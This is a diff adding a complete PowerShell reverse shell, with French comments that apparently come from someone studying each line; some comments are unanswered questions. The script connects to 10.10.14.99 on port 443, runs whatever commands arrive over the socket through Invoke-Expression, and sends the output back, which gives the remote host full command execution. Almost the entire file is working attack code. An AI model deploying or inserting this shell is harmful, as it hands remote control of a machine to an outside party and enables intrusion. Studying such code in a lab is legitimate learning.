@@ -1,0 +1,27 @@
+# New-Object : création d'un objet TCPCLient stocké dans la variable $client
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.99", 443);
+# GetStream() : Retourne le NetworkStream utilisé pour l'envoi et la réception de données.
+# NetworkStream : Fournit le flux de données sous-jacent pour l’accès réseau.
+$stream = $client.GetStream();
+# Créer un tableau byte de 65535 case ???
+# ForEach-Object { 0 } : ???
+[byte[]]$bytes = 0..65535 | ForEach-Object { 0 };
+# Read() : Lit des données dans NetworkStream et les stocke dans un tableau d’octets
+# -ne 0 : ???
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) 
+{;
+    # Créer un opbet de type ASCIIENdofing puis "parse" les bytes en texte ?
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+    # Invoke-Expression : Le cmdlet Invoke-Expression évalue ou exécute une chaîne spécifiée en tant que commande et renvoie les résultats de l'expression ou de la commande.
+        # Sans Invoke-Expression, une chaîne soumise à la ligne de commande est renvoyée (écho) sans modification.
+        # Les expressions sont évaluées et exécutées dans la portée actuelle.
+    $sendback = (Invoke-Expression $data 2>&1 | Out-String);
+    $sendback2 = $sendback + "# ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    # Write(byte[] buffer, int offset, int count): Tableau d'octets. Cette méthode copie count octets à partir de buffer dans le flux actuel.
+    $stream.Write($sendbyte, 0, $sendbyte.Length);
+    # Flush() : Efface toutes les mémoires tampons pour le writer actuel et provoque l'écriture des données mises en mémoire tampon dans le flux sous-jacent.
+    $stream.Flush()
+};
+# TCPClient.Close(): Supprime cette instance de TcpClient et demande que la connexion TCP sous-jacente soit fermée.
+$client.Close()
